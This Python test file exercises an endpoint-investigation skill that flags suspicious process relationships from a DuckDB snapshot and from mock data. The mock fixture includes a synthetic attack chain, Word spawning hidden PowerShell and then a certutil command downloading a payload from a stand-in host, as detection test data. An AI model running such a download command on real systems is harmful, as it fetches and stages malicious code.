"""
Test endpoint skill with synthetic data.
"""
import sys
import io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')

sys.path.insert(0, ".")

from datetime import datetime
from skills.endpoint_skill import EndpointSkill
from skills.base import SkillResult
from vinsoc_data.duckdb_store import DuckDBSnapshot
from vinsoc_data.domain_queries import DuckDBEndpointRepository


def test_endpoint_skill_with_snapshot():
    """Test endpoint skill using DuckDB snapshot."""
    print("=== Testing Endpoint Skill with Synthetic Data ===\n")

    # Load snapshot
    snapshot = DuckDBSnapshot("data/combined_sinsoc.duckdb")
    repository = DuckDBEndpointRepository(snapshot)

    # Create skill with repository
    skill = EndpointSkill(repository=repository)

    # Test hosts
    test_hosts = [
        "WORKSTATION-001",  # Has suspicious events
        "WORKSTATION-002",  # Has suspicious events
        "SRV-DC-01",        # Has suspicious events
        "NONEXISTENT-HOST", # Should return empty
    ]

    for host in test_hosts:
        print(f"\n--- Investigating: {host} ---")
        result = skill.execute(host=host)

        if result.success:
            data = result.data
            print(f"Host: {data['host']}")
            print(f"Time Range: {data['query_time_range']}")
            print(f"Process Relationships: {len(data['process_tree'])}")

            suspicious = data.get("suspicious_relationships", [])
            if suspicious:
                print(f"\n[!] SUSPICIOUS ACTIVITY DETECTED ({len(suspicious)} events):")
                for s in suspicious:
                    print(f"  - {s['parent']} -> {s['child']}")
                    print(f"    Reason: {s['suspicious_reasons']}")
                    print(f"    Technique: {s['mitre_technique']}")
            else:
                print("[+] No suspicious activity detected")
        else:
            print(f"[-] Error: {result.error}")


def test_endpoint_skill_with_mock():
    """Test endpoint skill using mock data (for comparison)."""
    print("\n\n=== Testing Endpoint Skill with Mock Data ===\n")

    # Sample mock data matching the synthetic format
    mock_data = {
        "WORKSTATION-001": {
            "process_tree": [
                {
                    "timestamp": "2024-09-27T08:15:22Z",
                    "host": "WORKSTATION-001",
                    "parent": "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE",
                    "parent_pid": 4520,
                    "child": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "child_pid": 7832,
                    "command_line": "powershell.exe -NoP -NonI -W Hidden -C ..."
                },
                {
                    "timestamp": "2024-09-27T08:15:45Z",
                    "host": "WORKSTATION-001",
                    "parent": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "parent_pid": 7832,
                    "child": "C:\\Windows\\System32\\certutil.exe",
                    "child_pid": 8012,
                    "command_line": "certutil.exe -urlcache -split -f http://malicious.site/payload.exe"
                }
            ],
            "observed_evidence": [
                {"type": "process_count", "value": 2}
            ]
        }
    }

    skill = EndpointSkill(mock_data=mock_data)
    result = skill.execute(host="WORKSTATION-001")

    if result.success:
        data = result.data
        print(f"Host: {data['host']}")
        print(f"Process Relationships: {len(data['process_tree'])}")

        suspicious = data.get("suspicious_relationships", [])
        print(f"\n🚨 Suspicious: {len(suspicious)}")
        for s in suspicious:
            print(f"  {s['parent']} → {s['child']}")
            print(f"  Technique: {s['mitre_technique']}")
    else:
        print(f"Error: {result.error}")


if __name__ == "__main__":
    test_endpoint_skill_with_snapshot()
    test_endpoint_skill_with_mock()
